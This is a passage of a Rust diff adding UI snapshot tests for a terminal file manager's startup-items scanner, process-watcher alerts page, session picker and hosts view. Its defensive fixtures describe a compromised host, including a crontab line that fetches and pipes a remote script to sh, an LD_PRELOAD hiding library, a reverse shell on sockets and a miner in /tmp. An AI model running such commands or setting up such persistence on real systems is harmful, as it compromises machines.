+        cleaned: Some(Cleanup { at: saved, removed: 12, bytes: 3_145_728, failed: 0 }),
+    };
+    stage.send(Msg::Storage(report));
+    stage.send(key(KeyCode::Down));
+    stage.send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Folder sizes and the name index")?;
+    check("storage_window", &stage, buffer)?;
+
+    stage.send(key(KeyCode::F(8)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2 items in /run/user/1000/borg-commander")?;
+    check("storage_clean_question", &stage, buffer)
+}
+
+/// Startup items on a made-up Linux machine, newest change first: a boot job that fetches a
+/// script, a user service whose program is gone, a preloaded library, an SSH key with a
+/// forced command, timers, services and autostart entries.
+fn startup_report() -> borg_core::StartupReport {
+    use borg_core::{ProgramPresence, RuleHit, StartupEntry, StartupItem, StartupPlace, StartupReport};
+    use borg_rules::{Evidence, Level, RuleMatch};
+    let at = |stamp: &str| -> SystemTime {
+        let stamp: jiff::Timestamp = stamp.parse().unwrap();
+        SystemTime::from(stamp)
+    };
+    let item = |place, file: &str, owner: &str, modified: &str, found: StartupEntry| StartupItem {
+        place,
+        file: file.into(),
+        found,
+        owner: Some(owner.into()),
+        modified: Some(at(modified)),
+        presence: ProgramPresence::Unknown,
+        resolved: None,
+        hits: Vec::new(),
+        read_only: false,
+    };
+    let entry = |line: Option<usize>, name: &str, runs: &str, program: Option<&str>, when: Option<&str>| StartupEntry {
+        line,
+        name: name.into(),
+        runs: runs.into(),
+        program: program.map(str::to_owned),
+        when: when.map(str::to_owned),
+        ..StartupEntry::default()
+    };
+    let boot_job = "@reboot curl -s http://203.0.113.7/u.sh | sh";
+    let mut fetch = item(
+        StartupPlace::Crontab,
+        "/var/spool/cron/crontabs/me",
+        "me",
+        "2026-01-15T09:41:00Z",
+        entry(Some(3), "me", "curl -s http://203.0.113.7/u.sh | sh", Some("curl"), Some("@reboot")),
+    );
+    fetch.presence = ProgramPresence::Present;
+    fetch.resolved = Some("/usr/bin/curl".into());
+    fetch.hits = vec![RuleHit {
+        rule: RuleMatch {
+            rule: "reboot_job_fetch".into(),
+            namespace: borg_rules::BUILT_IN.into(),
+            level: Level::Warning,
+            description: None,
+            false_positives: None,
+            evidence: Some(Evidence {
+                string: "$reboot".into(),
+                offset: 48,
+                length: boot_job.len() as u64,
+                bytes: boot_job.as_bytes().to_vec(),
+            }),
+        },
+        in_program: false,
+    }];
+    let mut helper = item(
+        StartupPlace::UserService,
+        "/home/me/.config/systemd/user/sync-helper.service",
+        "me",
+        "2026-01-14T22:03:00Z",
+        entry(
+            None,
+            "sync-helper.service",
+            "/home/me/.local/share/.sync/helper --quiet",
+            Some("/home/me/.local/share/.sync/helper"),
+            Some("default.target"),
+        ),
+    );
+    helper.presence = ProgramPresence::Missing;
+    let mut preload = item(
+        StartupPlace::Preload,
+        "/etc/ld.so.preload",
+        "root",
+        "2026-01-12T17:20:00Z",
+        entry(Some(1), "ld.so.preload", "/usr/local/lib/libhook.so", Some("/usr/local/lib/libhook.so"), None),
+    );
+    preload.presence = ProgramPresence::Present;
+    let mut key = item(
+        StartupPlace::AuthorizedKey,
+        "/home/me/.ssh/authorized_keys",
+        "me",
+        "2026-01-10T08:15:00Z",
+        entry(
+            Some(2),
+            "backup@203.0.113.7",
+            "command=\"/usr/local/bin/backup-receive\" ssh-ed25519 … backup@203.0.113.7",
+            Some("/usr/local/bin/backup-receive"),
+            None,
+        ),
+    );
+    key.presence = ProgramPresence::Present;
+    let shell = item(
+        StartupPlace::ShellStartup,
+        "/home/me/.bashrc",
+        "me",
+        "2025-12-02T19:30:00Z",
+        entry(None, ".bashrc", "eval \"$(direnv hook bash)\"", None, None),
+    );
+    let mut certbot = item(
+        StartupPlace::Timer,
+        "/etc/systemd/system/certbot.timer",
+        "root",
+        "2025-11-20T06:00:00Z",
+        entry(None, "certbot.timer", "certbot.service", None, Some("OnCalendar=*-*-* 00,12:00:00")),
+    );
+    certbot.found.user = Some("root".into());
+    let mut ssh = item(
+        StartupPlace::Service,
+        "/lib/systemd/system/ssh.service",
+        "root",
+        "2025-08-14T11:02:00Z",
+        entry(None, "ssh.service", "/usr/sbin/sshd -D $SSHD_OPTS", Some("/usr/sbin/sshd"), Some("multi-user.target")),
+    );
+    ssh.presence = ProgramPresence::Present;
+    let mut chat = item(
+        StartupPlace::Autostart,
+        "/etc/xdg/autostart/chat.desktop",
+        "root",
+        "2025-06-02T15:45:00Z",
+        entry(None, "Chat", "chat --minimized", Some("chat"), None),
+    );
+    chat.found.disabled = true;
+    StartupReport {
+        items: vec![fetch, helper, preload, key, shell, certbot, ssh, chat],
+        unread: vec![("/etc/cron.d/backup".into(), "Permission denied (os error 13)".into())],
+        problems: Vec::new(),
+    }
+}
+
+fn open_startup_items(stage: &mut Stage) -> Result<()> {
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('u'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    anyhow::ensure!(
+        effects.iter().any(|effect| matches!(effect, borg_core::Effect::StartupItems { .. })),
+        "opening reads the places"
+    );
+    Ok(())
+}
+
+/// Alt-U reads the places programs start from and lists what it found, newest change first,
+/// with the selected item's command, program and the rules it matched beside the list; the
+/// filter narrows the list and Alt-W gives it the whole width.
+#[test]
+fn startup_items_list_what_starts_on_its_own_newest_first() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_startup_items(&mut stage)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Reading the places programs start from")?;
+    check("startup_items_loading", &stage, buffer)?;
+
+    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
+    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "reboot_job_fetch")?;
+    ensure_text(&buffer, "/etc/cron.d/backup")?;
+    check("startup_items", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "missing")?;
+    check("startup_items_missing_program", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("root !timer".into()));
+    let buffer = stage.render(stage.started)?;
+    assert_eq!(stage.state.startup_items.len(), 3, "root's items other than the timer");
+    check("startup_items_filter", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    assert!(stage.state.startup_items.expanded, "Alt-W gives the list the whole width");
+    check("startup_items_expanded", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc));
+    assert!(!stage.state.startup_items.is_open(), "Esc closes the screen");
+    assert_eq!(stage.state.startup_items.filter, "root !timer", "the filter stays for the next time");
+    Ok(())
+}
+
+/// Enter on a startup item opens its file's folder in a panel beside the list, with the cursor
+/// on the file, and the list keeps its place. Tab gives the list the keys, which dims the files
+/// and shows how to bring the details back.
+#[test]
+fn startup_items_show_an_item_s_file_beside_the_list() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_startup_items(&mut stage)?;
+    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
+    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
+    let crontabs = ["alex", "me", "root"].map(|name| entry(name, EntryKind::File, 512, RECENT, false));
+    list_after(&mut stage, key(KeyCode::Enter), crontabs.to_vec())?;
+    let buffer = stage.render(stage.started)?;
+    assert!(stage.state.files_beside_focused(), "the files take the keys");
+    assert_eq!(stage.state.active_panel().hovered_entry().map(|entry| entry.name.as_str()), Some("me"));
+    ensure_text(&buffer, "reboot_job_fetch")?;
+    ensure_text(&buffer, "crontabs")?;
+    check("startup_items_file_beside", &stage, buffer)?;
+
+    let screen = Snapshot::from_buffer(stage.render(stage.started)?, &stage.palette, None);
+    let (column, row) = screen.find("alex").context("alex in the files")?;
+    let right = crossterm::event::MouseEvent {
+        kind: crossterm::event::MouseEventKind::Down(crossterm::event::MouseButton::Right),
+        column,
+        row,
+        modifiers: KeyModifiers::NONE,
+    };
+    let msg = borg_ui::mouse_input(&stage.state, right, false, stage.started);
+    anyhow::ensure!(matches!(msg, Some(Msg::ContextMenu { .. })), "{msg:?}");
+    stage.send(msg.unwrap());
+    let menu = match &stage.state.overlay {
+        Some(borg_core::Overlay::ContextMenu(menu)) => menu.menu.title.clone(),
+        other => anyhow::bail!("a right-click on a file opens its menu: {other:?}"),
+    };
+    assert_eq!(menu, "alex", "the menu names the file under the pointer");
+    stage.send(key(KeyCode::Esc));
+    assert!(stage.state.files_beside_focused(), "Esc closes the menu and the files keep the keys");
+    stage.send(key(KeyCode::Down));
+    assert_eq!(stage.state.active_panel().hovered_entry().map(|entry| entry.name.as_str()), Some("me"));
+
+    stage.send(key(KeyCode::Tab));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Alt-O Show file")?;
+    check("startup_items_file_beside_list_keys", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc));
+    assert!(stage.state.lent.is_none() && stage.state.startup_items.is_open(), "the details come back");
+    Ok(())
+}
+
+/// On a narrow screen the list keeps the time, the place and the command and leaves out the
+/// columns that do not fit.
+#[test]
+fn startup_items_drop_columns_on_a_narrow_screen() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 80, rows: 28 }, Motion::STILL)?;
+    open_startup_items(&mut stage)?;
+    let id = stage.state.startup_items.pending.context("the screen waits for the places")?;
+    stage.send(Msg::StartupItems { id, result: Ok(startup_report()) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "2026-01-15 09:41")?;
+    check("startup_items_narrow", &stage, buffer)?;
+    Ok(())
+}
+
+/// Alerts as the watcher would have written them: a remote shell it froze, a program running from
+/// a temporary folder, a forced library, a run of discovery commands, and a start left running
+/// because somebody may be working in that terminal.
+fn alert_log() -> borg_core::AlertLog {
+    use borg_core::{
+        AlertLog, Allowance, Ancestor, Evidence, ProcessKey, Protection, Response, StartedProcess, StreamKind,
+        WatchFinding, WatchSource, WatchStatus,
+    };
+    let at = |stamp: &str| -> SystemTime {
+        let stamp: jiff::Timestamp = stamp.parse().expect("a readable moment");
+        SystemTime::from(stamp)
+    };
+    let parent = |pid: u32, program: &str, terminal: bool| Ancestor {
+        pid,
+        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
+        program: Some(program.into()),
+        terminal,
+        command: program.to_owned(),
+        ..Ancestor::default()
+    };
+    let process = |pid: u32, program: &str, command: &[&str], user: &str, ancestors: Vec<Ancestor>| StartedProcess {
+        key: ProcessKey { pid, start: u64::from(pid) * 100 },
+        name: PathBuf::from(program).file_name().expect("a program").to_string_lossy().into_owned(),
+        program: Some(program.into()),
+        command: command.iter().map(|argument| (*argument).to_owned()).collect(),
+        user: user.into(),
+        ancestors,
+        ..StartedProcess::default()
+    };
+    let learned = at("2026-01-08T09:00:00Z");
+    let mut log = AlertLog::watching(WatchStatus {
+        source: WatchSource::Kernel,
+        since: at("2026-01-01T09:00:00Z"),
+        learned_at: learned,
+        freeze: true,
+        stage: None,
+        seen: 48_120,
+        suppressed: 0,
+        delivery: borg_core::AlertDelivery::Sent,
+    });
+
+    let nginx = parent(812, "/usr/sbin/nginx", false);
+    let mut shell =
+        process(29_314, "/bin/sh", &["sh", "-i"], "www-data", vec![nginx.clone(), parent(1, "/sbin/init", false)]);
+    shell.input = StreamKind::Socket;
+    shell.output = StreamKind::Socket;
+    shell.errors = StreamKind::Socket;
+    let id = log.add(
+        at("2026-01-15T11:58:12Z"),
+        WatchFinding::ShellOnSocket { shell: "sh".into() },
+        Response::Frozen,
+        shell,
+    );
+    if let Some(alert) = log.find(id) {
+        alert.evidence = Evidence {
+            connections: vec!["socket:[412233]".into(), "socket:[412240]".into()],
+            program_hash: Some("8c98028bf435d0af5ab8074969a7e4f7e136b30b53df80685e5763ea415d8fbe".into()),
+            hits: Vec::new(),
+            missing: None,
+        };
+    }
+
+    let miner = process(29_355, "/tmp/.x/kworker", &["/tmp/.x/kworker", "--quiet"], "www-data", vec![nginx.clone()]);
+    log.add(
+        at("2026-01-15T11:57:40Z"),
+        WatchFinding::ProgramInTempFolder { program: "kworker".into(), folder: "/tmp".into() },
+        Response::Frozen,
+        miner,
+    );
+
+    let curl =
+        process(29_301, "/usr/bin/curl", &["curl", "-s", "http://203.0.113.7/u.sh"], "www-data", vec![nginx.clone()]);
+    log.add(
+        at("2026-01-15T11:55:03Z"),
+        WatchFinding::PreloadSet {
+            program: "curl".into(),
+            variable: "LD_PRELOAD".into(),
+            value: "/tmp/libhide.so".into(),
+        },
+        Response::Alerted,
+        curl,
+    );
+
+    let python = parent(9_044, "/usr/bin/python3", false);
+    let discovery = process(29_288, "/usr/bin/whoami", &["whoami"], "deploy", vec![python]);
+    log.add(
+        at("2026-01-15T11:40:22Z"),
+        WatchFinding::DiscoveryRun { parent: "python3".into(), commands: 4, seconds: 20 },
+        Response::Spared(Protection::Terminal),
+        discovery,
+    );
+
+    let tmux = parent(2_210, "/usr/bin/tmux", true);
+    let mut typed = process(28_990, "/bin/bash", &["bash"], "me", vec![tmux]);
+    typed.terminal = Some("pts/2".into());
+    typed.input = StreamKind::Terminal;
+    typed.output = StreamKind::Terminal;
+    let id = log.add(
+        at("2026-01-14T21:10:00Z"),
+        WatchFinding::ParentNeverStartedIt { parent: "tmux".into(), program: "bash".into() },
+        Response::Spared(Protection::OnlyANotice),
+        typed,
+    );
+    if let Some(alert) = log.find(id) {
+        alert.seen = true;
+        alert.state = borg_core::AlertState::Allowed;
+    }
+    let _ = Allowance::default();
+    log
+}
+
+fn open_alerts(stage: &mut Stage) -> Result<()> {
+    stage.state.settings.preferences.process_watch = true;
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    anyhow::ensure!(
+        effects.iter().any(|effect| matches!(effect, borg_core::Effect::Alerts { .. })),
+        "opening reads the alert log"
+    );
+    Ok(())
+}
+
+fn send_alerts(stage: &mut Stage) -> Result<()> {
+    let id = stage.state.alerts.pending.context("the page waits for its log")?;
+    let reply = borg_core::AlertsReply { log: alert_log(), notice: None };
+    stage.send(Msg::Alerts { id, result: Ok(reply) });
+    Ok(())
+}
+
+/// Alt-L opens the Alerts page, newest alert first, with the selected alert's reason, process and
+/// evidence beside the list; the filter narrows it and Alt-W gives the list the whole width.
+#[test]
+fn alerts_list_what_the_process_watcher_found_newest_first() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Reading the alert log")?;
+    check("alerts_loading", &stage, buffer)?;
+
+    send_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Shell on a network socket")?;
+    ensure_text(&buffer, "Frozen")?;
+    check("alerts", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Down)).send(key(KeyCode::Down));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "LD_PRELOAD")?;
+    check("alerts_preload", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Char('/'))).send(Msg::Paste("www-data !temporary".into()));
+    let buffer = stage.render(stage.started)?;
+    assert_eq!(stage.state.alerts.len(), 2, "the web server's own alerts other than the temporary folder");
+    check("alerts_filter", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Enter)).send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    assert!(stage.state.alerts.expanded, "Alt-W gives the list the whole width");
+    check("alerts_expanded", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc)).send(key(KeyCode::Esc));
+    assert!(!stage.state.alerts.is_open(), "Esc clears the filter, then closes the page");
+    Ok(())
+}
+
+/// K asks before it ends a process, since killing one cannot be taken back.
+#[test]
+fn alerts_ask_before_killing_a_frozen_process() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    send_alerts(&mut stage)?;
+    stage.send(key(KeyCode::Char('k')));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Kill process")?;
+    check("alerts_confirm_kill", &stage, buffer)?;
+    Ok(())
+}
+
+/// A log Borg could not read was kept aside, and the page says where below the list, the path
+/// broken over lines when the pane is narrower.
+#[test]
+fn alerts_say_where_a_log_borg_could_not_read_went() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    let id = stage.state.alerts.pending.context("the page waits for its log")?;
+    let aside = PathBuf::from(format!("{HOME}/.local/state/borg/{}", borg_core::ALERT_LOG_ASIDE));
+    let mut log = alert_log();
+    log.alerts.truncate(KEPT_ASIDE_ALERTS);
+    log.kept_aside = Some(aside);
+    stage.send(Msg::Alerts { id, result: Ok(borg_core::AlertsReply { log, notice: None }) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "could not read the alert log")?;
+    ensure_text(&buffer, "/home/me/.local/state/borg/alerts-unread")?;
+    check("alerts_log_kept_aside", &stage, buffer)?;
+    Ok(())
+}
+
+/// A watcher that freezes with nowhere to send its alerts says so above the details, and in the
+/// list's last row once the list takes the whole width.
+#[test]
+fn alerts_say_when_they_reach_nobody() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 132, rows: 34 }, Motion::STILL)?;
+    open_alerts(&mut stage)?;
+    let id = stage.state.alerts.pending.context("the page waits for its log")?;
+    let mut log = alert_log();
+    log.watch.delivery = borg_core::AlertDelivery::Local;
+    stage.send(Msg::Alerts { id, result: Ok(borg_core::AlertsReply { log, notice: None }) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Borg freezes processes here and nobody is told.")?;
+    ensure_text(&buffer, "[watch.notify] in config.toml.")?;
+    check("alerts_unsent", &stage, buffer)?;
+
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Borg freezes processes here and nobody is told. Set up [watch.notify] in config.toml.")?;
+    check("alerts_unsent_expanded", &stage, buffer)?;
+    Ok(())
+}
+
+/// Turned on and not running yet, with only a heartbeat set up, the watcher says that a heartbeat
+/// carries no alerts.
+#[test]
+fn alerts_say_that_a_heartbeat_alone_sends_none() -> Result<()> {
+    let mut stage = stage(SIZE, Motion::STILL)?;
+    stage.state.settings.alert_delivery = borg_core::AlertDelivery::HeartbeatOnly;
+    open_alerts(&mut stage)?;
+    let id = stage.state.alerts.pending.context("the page waits for its log")?;
+    let empty = borg_core::AlertsReply { log: borg_core::AlertLog::default(), notice: None };
+    stage.send(Msg::Alerts { id, result: Ok(empty) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Alerts stay on this machine.")?;
+    ensure_text(&buffer, "only says the watcher runs.")?;
+    check("alerts_unsent_heartbeat", &stage, buffer)?;
+    Ok(())
+}
+
+/// With the watcher turned off the page says how to turn it on, and on a narrow screen the list
+/// keeps the time, the rule and the program.
+#[test]
+fn alerts_say_when_nothing_is_watching_and_drop_columns_on_a_narrow_screen() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 80, rows: 20 }, Motion::STILL)?;
+    let effects = borg_core::update(
+        &mut stage.state,
+        Msg::Key(KeyEvent::new(KeyCode::Char('l'), KeyModifiers::ALT)),
+        stage.started,
+    );
+    let id = effects
+        .iter()
+        .find_map(|effect| match effect {
+            borg_core::Effect::Alerts { id, .. } => Some(*id),
+            _ => None,
+        })
+        .context("opening reads the alert log")?;
+    let empty = borg_core::AlertsReply { log: borg_core::AlertLog::default(), notice: None };
+    stage.send(Msg::Alerts { id, result: Ok(empty) });
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "Watch")?;
+    check("alerts_watcher_off", &stage, buffer)?;
+
+    stage.state.settings.preferences.process_watch = true;
+    stage.send(key(KeyCode::Char('r')));
+    send_alerts(&mut stage)?;
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "11:58")?;
+    check("alerts_narrow", &stage, buffer)?;
+    Ok(())
+}
+
+fn start_sessions() -> Vec<borg_core::SessionEntry> {
+    let entry = |id: &str, name: &str, used: Option<SystemTime>, in_use| borg_core::SessionEntry {
+        id: id.into(),
+        name: name.into(),
+        last_used: used,
+        in_use,
+    };
+    vec![
+        entry(borg_core::DEFAULT_SESSION, "Default", at(RECENT - 3_600), Some(borg_core::SessionUse::Terminal)),
+        entry("8f3c2a", "web", at(RECENT), Some(borg_core::SessionUse::Service)),
+        entry("41d9e0", "scratch", at(OLD), None),
+        entry("c07b55", "migration-2024", None, None),
+    ]
+}
+
+/// The window Borg opens on start, drawn on a screen of `size` in the default theme and checked
+/// against the snapshot `name`.
+fn start_window(name: &str, picker: &borg_core::SessionPicker, size: GridSize) -> Result<Buffer> {
+    let stage = stage(size, Motion::STILL)?;
+    let look = borg_ui::StartLook { theme: stage.themes.find(None), palette: &stage.palette, truecolor: true };
+    let mut buffer = Buffer::empty(ratatui::layout::Rect::new(0, 0, size.cols, size.rows));
+    borg_ui::draw_session_picker(picker, &look, &stage.clock, &mut buffer);
+    check(name, &stage, buffer.clone())?;
+    Ok(buffer)
+}
+
+fn picker_key(picker: &mut borg_core::SessionPicker, code: KeyCode) -> Option<borg_core::SessionChoice> {
+    picker.update(borg_core::PickerInput::Key(KeyEvent::new(code, KeyModifiers::NONE)))
+}
+
+/// The window says what a session is, marks the sessions another terminal or the service runs,
+/// says why those stay, and asks before removing an old one with No chosen.
+#[test]
+fn start_window_marks_active_sessions_and_asks_before_removing_an_old_one() -> Result<()> {
+    let mut picker = borg_core::SessionPicker::new(start_sessions());
+    let buffer = start_window("start_sessions", &picker, SIZE)?;
+    ensure_text(&buffer, "A session is a saved workspace")?;
+    ensure_text(&buffer, "● Kept running by the service")?;
+    ensure_text(&buffer, "● Open in another terminal")?;
+    ensure_text(&buffer, "2024-06-01")?;
+
+    picker_key(&mut picker, KeyCode::F(8));
+    let buffer = start_window("start_sessions_kept_by_service", &picker, SIZE)?;
+    ensure_text(&buffer, "service attach NAME")?;
+
+    picker_key(&mut picker, KeyCode::Down);
+    picker_key(&mut picker, KeyCode::Down);
+    start_window("start_sessions_idle", &picker, SIZE)?;
+    picker_key(&mut picker, KeyCode::F(8));
+    let buffer = start_window("start_sessions_remove_confirm", &picker, SIZE)?;
+    ensure_text(&buffer, "Remove session \"scratch\"?")?;
+    assert_eq!(picker_key(&mut picker, KeyCode::Enter), None, "No is chosen first");
+    Ok(())
+}
+
+#[test]
+fn start_window_names_a_new_session_and_fits_a_narrow_screen() -> Result<()> {
+    let mut picker = borg_core::SessionPicker::new(start_sessions());
+    picker_key(&mut picker, KeyCode::F(7));
+    for letter in "web".chars() {
+        picker_key(&mut picker, KeyCode::Char(letter));
+    }
+    picker_key(&mut picker, KeyCode::Enter);
+    let buffer = start_window("start_sessions_name_taken", &picker, SIZE)?;
+    ensure_text(&buffer, "A session named \"web\" already exists.")?;
+    start_window("start_sessions_narrow", &borg_core::SessionPicker::new(start_sessions()), NARROW)?;
+    Ok(())
+}
+
+#[test]
+fn searches_list_close_names_after_exact_ones_and_mark_what_matched() -> Result<()> {
+    use borg_core::{Action, Overlay, Pointer, SearchProgress, Side, SortKey};
+    let mut stage = stage(GridSize { cols: 160, rows: 20 }, Motion::STILL)?;
+    stage.send(Msg::Pointer(Pointer::Action(Action::Search)));
+    anyhow::ensure!(matches!(&stage.state.overlay, Some(Overlay::Search(form)) if form.typos), "on by default");
+    ensure_text(&stage.render(stage.started)?, "[x] Also find names with typos and shuffled digits")?;
+    stage.send(key(KeyCode::Backspace));
+    for msg in chars("reciept") {
+        stage.send(msg);
+    }
+    stage.send(key(KeyCode::Enter));
+    let generation = stage.state.panels[0].generation();
+    let found = [
+        ("receipts/receipt-march.pdf", EntryKind::File),
+        ("scans/Receipts 2023.zip", EntryKind::File),
+        ("receipt.pdf", EntryKind::File),
+        ("receipts", EntryKind::Dir),
+        ("docs/reciept-template.md", EntryKind::File),
+    ]
+    .map(|(path, kind)| {
+        let mut file = entry(path.rsplit('/').next().unwrap_or(path), kind, 2_048, RECENT, false);
+        file.source = Some(PathBuf::from("/home/me/projects/borg").join(path));
+        file
+    });
+    stage.send(Msg::Batch { side: Side::Left, generation, entries: found.to_vec() });
+    let progress = SearchProgress { visited: 1_204, ..Default::default() };
+    stage.send(Msg::SearchProgress { side: Side::Left, generation, progress });
+    stage.send(Msg::Listed { side: Side::Left, generation, error: None });
+    anyhow::ensure!(stage.state.panels[0].sort().key == SortKey::Match, "results open best match first");
+    let buffer = stage.render(stage.started)?;
+    ensure_text(&buffer, "close matches: 4")?;
+    check("search_close_matches", &stage, buffer)
+}
+
+/// A version far enough ahead that these hosts never run an older Borg than the one tested.
+const CURRENT: &str = "1.4.2";
+
+fn paired(name: &str, last_seen: Option<SystemTime>) -> borg_core::PairedHost {
+    borg_core::PairedHost {
+        identity: format!("key-{name}"),
+        machine: name.into(),
+        relay: "wss://relay.example".into(),
+        last_seen,
+    }
+}
+
+fn host_reply(
+    name: &str,
+    version: &str,
+    sessions: usize,
+    figures: Option<borg_core::HostFigures>,
+) -> borg_core::HostHeard {
+    let info = borg_core::RemoteHostInfo {
+        version: Some(version.into()),
+        platform: Some("linux / x86_64".into()),
+        service: Some(true),
+        latency_ms: Some(38),
+        relay: String::new(),
+    };
+    let sessions = (0..sessions)
+        .map(|index| borg_core::RemoteChoice {
+            identity: format!("key-{name}"),
+            machine: name.into(),
+            session: Some(format!("s{index}")),
+            name: if index == 0 { "main".into() } else { format!("work-{index}") },
+            info: info.clone(),
+            ..Default::default()
+        })
+        .collect();
+    borg_core::HostHeard::Answered(Box::new(borg_core::HostReply {
+        info,
+        sessions,
+        figures,
+        seen: UNIX_EPOCH + Duration::from_secs(1_768_478_000),
+    }))
+}
+
+struct HostLoad {
+    cores: usize,
+    cpu: u32,
+    load: u32,
+    used: u64,
+    total: u64,
+    disk: (u64, u64),
+}
+
+fn host_figures(load: HostLoad) -> borg_core::HostFigures {
+    borg_core::HostFigures {
+        cores: load.cores,
+        cpu: Some(load.cpu),
+        load: Some(borg_core::LoadAverage { one: load.load, five: load.load, fifteen: load.load }),
+        uptime: Some(16 * 86_400 + 3_600),
+        memory: Some(borg_core::MemoryFigures {
+            used: load.used,
+            total: load.total,
+            swap_used: GIB / 2,
+            swap_total: 2 * GIB,
+        }),
+        disk: Some(borg_core::DiskFigures { mount: "/".into(), total: load.disk.0, available: load.disk.1 }),
+        watch: Some(borg_core::WatchFigures { on: true, ..Default::default() }),
+        containers: None,
+    }
+}
+
+/// Seven paired hosts: four answering with figures, one quiet for a while, one on a Borg too old to
+/// send figures, and two offline.
+fn send_hosts(stage: &mut Stage) -> Result<()> {
+    let clock: jiff::Zoned = CLOCK.parse()?;
+    let now = SystemTime::from(clock.timestamp());
+    let hosts = vec![
+        paired("web-01", None),
+        paired("db-01", None),
+        paired("ci-runner", None),
+        paired("mac-mini", None),
+        paired("ubuntu-hel1", None),
+        paired("test-trash", Some(now - Duration::from_secs(3 * 86_400))),
+        paired("old-nas", None),
+    ];
+    let answered = stage.started;
+    let later = stage.started + Duration::from_secs(40);
+    borg_core::update(&mut stage.state, Msg::HostsListed(Ok(hosts)), answered);
+    let mut send = |name: &str, heard: borg_core::HostHeard, at: Instant| {
+        borg_core::update(&mut stage.state, Msg::HostAnswered { identity: format!("key-{name}"), answer: heard }, at);
+    };
+    let mut web = host_figures(HostLoad {
+        cores: 8,
+        cpu: 3_100,
+        load: 80,
+        used: 10 * GIB,
+        total: 16 * GIB,
+        disk: (50 * GIB, 4 * GIB),
+    });
+    web.watch = Some(borg_core::WatchFigures { on: true, unread_alerts: 1, ..Default::default() });
+    web.containers = Some(borg_core::ContainerFigures { running: 7, total: 8, troubled: 0 });
+    send("web-01", host_reply("web-01", CURRENT, 3, Some(web)), later);
+    let mut db = host_figures(HostLoad {
+        cores: 16,
+        cpu: 8_800,
+        load: 930,
+        used: 23 * GIB,
+        total: 32 * GIB,
+        disk: (480 * GIB, 290 * GIB),
+    });
+    db.watch = Some(borg_core::WatchFigures {
+        on: true,
+        learning_until: Some(SystemTime::now() + Duration::from_secs(3 * 86_400 - 60)),
+        ..Default::default()
+    });
+    send("db-01", host_reply("db-01", CURRENT, 1, Some(db)), later);
+    let mut ci = host_figures(HostLoad {
+        cores: 4,
+        cpu: 10_000,
+        load: 1_000,
+        used: 31 * GIB,
+        total: 32 * GIB,
+        disk: (240 * GIB, 80 * GIB),
+    });
+    ci.containers = Some(borg_core::ContainerFigures { running: 12, total: 14, troubled: 1 });
+    send("ci-runner", host_reply("ci-runner", "0.11.4", 1, Some(ci)), later);
+    let mini = host_figures(HostLoad {
+        cores: 8,
+        cpu: 1_200,
+        load: 180,
+        used: 7 * GIB,
+        total: 16 * GIB,
+        disk: (460 * GIB, 210 * GIB),
+    });
+    send("mac-mini", host_reply("mac-mini", CURRENT, 2, Some(mini)), answered);
+    send("mac-mini", borg_core::HostHeard::Silent, answered + Duration::from_secs(10));
+    send("ubuntu-hel1", host_reply("ubuntu-hel1", "0.10.2", 1, None), later);
+    send("test-trash", borg_core::HostHeard::Offline, later);
+    send("old-nas", borg_core::HostHeard::Offline, later);
+    Ok(())
+}
+
+/// The Hosts page from the Remote menu: a card for each paired host with its load, memory, fullest
